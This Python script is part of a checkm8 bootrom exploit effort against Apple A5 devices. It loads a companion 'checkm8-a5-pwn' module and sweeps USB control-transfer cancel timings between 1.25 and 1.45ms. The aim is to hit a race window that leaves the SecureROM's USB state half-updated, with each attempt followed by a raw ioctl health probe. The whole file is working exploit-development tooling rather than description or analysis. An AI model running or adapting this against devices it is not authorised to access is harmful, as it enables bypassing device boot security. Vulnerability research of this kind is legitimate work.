#!/usr/bin/env python3
"""The band sweep: hunt the mid-data cut window in [1.25..1.45]ms.

Per timing: two abandoned leak-shape requests (GET_DESCRIPTOR string3
HABR_LANG wLength 0x80), each followed by a 700ms reap wait and a serve
health probe. The race map says: <1.2ms = cancel-wins, >=1.5ms =
ROM-wins. If any timing lands 0 < actual < 128, the mid-data cut is
REAL and the io_globals sit mid-phase at rcvd=partial.
"""
import ctypes
import fcntl
import glob
import importlib.util
import os
import time

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
d = importlib.util.module_from_spec(spec)
spec.loader.exec_module(d)


def serve_probe(timeout=400):
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() != "1227":
                continue
        except OSError:
            continue
        n = os.path.dirname(p)
        bus = int(open(n + "/busnum").read())
        dev = int(open(n + "/devnum").read())
        fd = os.open("/dev/bus/usb/%03d/%03d" % (bus, dev), os.O_RDWR)

        class Ctl(ctypes.Structure):
            _fields_ = [('r', ctypes.c_ubyte), ('b', ctypes.c_ubyte),
                        ('w', ctypes.c_ushort), ('i', ctypes.c_ushort),
                        ('l', ctypes.c_ushort), ('t', ctypes.c_uint),
                        ('d', ctypes.c_void_p)]
        buf = ctypes.create_string_buffer(255)
        ct = Ctl(0x80, 6, 0x0303, 0x0409, 255, timeout,
                 ctypes.cast(buf, ctypes.c_void_p))
        t0 = time.time()
        try:
            r = fcntl.ioctl(fd, 0xC0185500, ct)
            return "ret=%d %.1fms cpid=%s" % (
                r, (time.time() - t0) * 1000,
                "CPID" in buf.raw[:r].decode("utf-16le", "ignore"))
        except OSError as e:
            return "errno=%d %.1fms" % (e.errno, (time.time() - t0) * 1000)
        finally:
            os.close(fd)
    return "GONE"


def main():
    usb = d.LibUSB()
    dev, handle, desc, _ = d.acquire(usb, want_serial=False)
    print("acquired; sweep starting")
    for t_us in [1250, 1300, 1350, 1400, 1450]:
        for rep in range(2):
            try:
                rc, info = usb.raw_ctrl(handle, 0x80, 6, (3 << 8) | 3, 0x040A,
                                        0x80, b'', abandon=True,
                                        cancel_at=0x40,
                                        abandon_timeout_ms=t_us / 1000.0,
                                        timeout_ms=500,
                                        name='band %d.%d' % (t_us, rep))
                status, actual = info[0], info[1]
                cut = 0 < actual < 128
                print("t=%d r%d: %s actual=%-3d elapsed=%-5dus %s"
                      % (t_us, rep, d.STATUS_NAMES[status], actual, info[3],
                         "<<<< MID-DATA CUT" if cut else ""))
            except SystemExit as e:
                print("t=%d r%d: SystemExit %s" % (t_us, rep, e))
                return 1
            time.sleep(0.7)  # let the xHC reap finish before serving
            print("  post: %s" % serve_probe())
    print("SWEEP DONE")


if __name__ == "__main__":
    main()
